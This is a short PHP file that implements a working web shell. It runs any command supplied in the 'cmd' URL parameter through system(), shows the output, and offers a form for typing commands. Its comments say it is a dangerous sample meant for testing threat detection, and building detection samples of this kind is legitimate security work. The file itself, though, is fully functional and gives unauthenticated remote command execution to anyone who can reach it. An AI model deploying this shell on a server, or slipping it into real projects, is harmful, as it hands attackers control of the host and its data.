<?php
// This is a real command execution script that will actually execute commands
// WARNING: This is dangerous and only for testing threat detection
if(isset($_GET['cmd'])) {
    echo "<h1>Command Execution</h1>";
    echo "<p>Executing command: <strong>" . htmlspecialchars($_GET['cmd']) . "</strong></p>";
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<h1>Command Execution</h1>";
    echo "<p>Enter a command to execute:</p>";
    echo "<form method='GET'>";
    echo "<input type='text' name='cmd' placeholder='Enter command' style='width: 300px;'>";
    echo "<input type='submit' value='Execute'>";
    echo "</form>";
}
?>